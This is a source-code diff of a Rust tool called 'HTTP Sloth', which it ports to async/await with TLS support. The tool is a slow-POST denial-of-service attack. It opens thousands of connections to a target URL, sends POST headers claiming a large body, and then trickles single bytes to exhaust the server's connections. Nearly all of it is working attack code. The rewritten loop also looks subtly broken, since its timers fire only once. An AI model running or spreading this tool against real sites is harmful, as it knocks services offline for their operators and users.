@@ -1,5 +1,3 @@
-use std::io;
-use std::io::Write;
 use std::net::ToSocketAddrs;
 use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::Arc;
@@ -9,23 +7,19 @@ use std::time::Duration;
 extern crate clap;
 use clap::{App, Arg};
 
-extern crate futures;
-use futures::*;
-
 extern crate tokio;
+use tokio::io::AsyncWriteExt;
 use tokio::net::TcpStream;
-
-extern crate tokio_timer;
-use tokio_timer::*;
+use tokio::timer::Interval;
 
 extern crate tokio_rustls;
+use tokio_rustls::{rustls::ClientConfig, webpki::DNSNameRef, TlsConnector};
 
 extern crate url;
 use url::Url;
 
-mod connector;
-
-fn main() {
+#[tokio::main]
+async fn main() {
     let arguments = App::new("HTTP Sloth")
         .arg(Arg::with_name("url")
              .long("url")
@@ -47,16 +41,15 @@ fn main() {
         .get_matches();
 
     let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
-    let scheme = parsed_url.scheme().to_owned();
+    // let scheme = parsed_url.scheme().to_owned();
     let host = parsed_url.host_str().unwrap().to_owned();
     let path = parsed_url.path();
     let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
-    let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
+    let tick = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
     let max_connections_count: usize =
         value_t!(arguments, "max-connections", usize).unwrap_or(8192);
-    let spawn_interval = Duration::from_millis(10);
-
     let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
+    let body_portion = "a";
     let addr = format!(
         "{}:{}",
         parsed_url.host_str().unwrap(),
@@ -67,68 +60,86 @@ fn main() {
     .next()
     .unwrap();
 
+    let mut config = ClientConfig::new();
+    config
+        .root_store
+        .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);
+    let tls_connector = TlsConnector::from(Arc::new(config));
+
     let live_connections = Arc::new(AtomicUsize::new(0));
-    let connection_number = AtomicUsize::new(0);
+    let mut interval = Interval::new_interval(Duration::from_secs(1));
 
-    let connector = connector::construct(&scheme, host);
-    let cycle = Interval::new_interval(spawn_interval)
-        .for_each({
-            let live_connections = Arc::clone(&live_connections);
-            move |_| {
-                let connections_count = live_connections.load(Ordering::SeqCst);
-                if connections_count >= max_connections_count {
-                    return Ok(());
-                };
-                let connection_number = connection_number.fetch_add(1, Ordering::SeqCst) + 1;
-                let start = start.clone();
-
-                let socket = TcpStream::connect(&addr);
-
-                let connection = connector(socket)
-                    .and_then(move |mut socket| {
-                        let _start_written = socket.write(start.as_bytes());
-                        let _start_flushed = socket.flush();
-                        println!("Stream number: {} spawned.", connection_number);
-                        Ok(socket)
-                    })
-                    .and_then(move |mut socket| {
-                        Interval::new_interval(interval)
-                            .for_each(move |_| {
-                                let _byte_written = socket.write(b"a");
-                                let _byte_flushed = socket.flush();
-                                println!("Stream number: {} written.", connection_number);
-                                Ok(())
-                            })
-                            .map_err(|e| {
-                                io::Error::new(io::ErrorKind::Other, format!("Timer error: {}", e))
-                            })
-                    });
-                live_connections.fetch_add(1, Ordering::SeqCst);
-                tokio::spawn(connection.map_err({
-                    let live_connections = Arc::clone(&live_connections);
-                    move |e| {
-                        live_connections.fetch_sub(1, Ordering::SeqCst);
-                        println!("Connection: {} failed! Reason: {}", connection_number, e);
-                    }
-                }));
-                Ok(())
-            }
-        })
-        .map_err(move |e| println!("Cannot spawn connections cycle loop. Reason: {}", e));
-
-    let live_stats = Interval::new_interval(Duration::from_secs(5))
-        .for_each(move |_| {
+    {
+        let live_connections = Arc::clone(&live_connections);
+        tokio::spawn(async move {
+            interval.next().await;
             println!(
                 "Live Connections: {}",
                 live_connections.load(Ordering::SeqCst)
             );
-            Ok(())
-        })
-        .map_err(move |e| println!("Cannot spawn live connetions print task. Reason: {}", e));
+        });
+    }
 
-    tokio::run(futures::future::lazy(|| {
-        tokio::spawn(cycle);
-        tokio::spawn(live_stats);
-        Ok(())
-    }));
+    let sleep = std::time::Duration::from_millis(10);
+    loop {
+        let live_connections = Arc::clone(&live_connections);
+        if live_connections.load(Ordering::SeqCst) >= max_connections_count {
+            std::thread::sleep(sleep);
+            continue;
+        }
+
+        let connection_number = live_connections.fetch_add(1, Ordering::SeqCst) + 1;
+        let host = host.clone();
+        let start = start.clone();
+        let tls_connector = tls_connector.clone();
+
+        tokio::spawn(async move {
+            let socket = TcpStream::connect(&addr);
+            let dnsname = DNSNameRef::try_from_ascii_str(&host)
+                .map_err(|e| {
+                    live_connections.fetch_sub(1, Ordering::SeqCst);
+                    format!(
+                        "ERROR: DNSNameRef await: Connection number: {}: {}",
+                        connection_number, e
+                    );
+                })
+                .unwrap();
+            let socket = socket
+                .await
+                .map_err(|e| {
+                    live_connections.fetch_sub(1, Ordering::SeqCst);
+                    format!(
+                        "ERROR: Socket await: Connection number: {}: {}",
+                        connection_number, e
+                    );
+                })
+                .unwrap();
+            let mut connector = tls_connector
+                .connect(dnsname, socket)
+                .await
+                .map_err(|e| {
+                    live_connections.fetch_sub(1, Ordering::SeqCst);
+                    format!(
+                        "ERROR: Connector connect await: Connection number: {}: {}",
+                        connection_number, e
+                    );
+                })
+                .unwrap();
+
+            // Write start
+            AsyncWriteExt::write(&mut connector, start.as_bytes())
+                .await
+                .unwrap();
+            AsyncWriteExt::flush(&mut connector).await.unwrap();
+            let mut interval = Interval::new_interval(tick);
+            tokio::spawn(async move {
+                interval.next().await;
+                // Write small piece of body
+                AsyncWriteExt::write(&mut connector, body_portion.as_bytes())
+                    .await
+                    .unwrap();
+                AsyncWriteExt::flush(&mut connector).await.unwrap();
+            });
+        });
+    }
 }
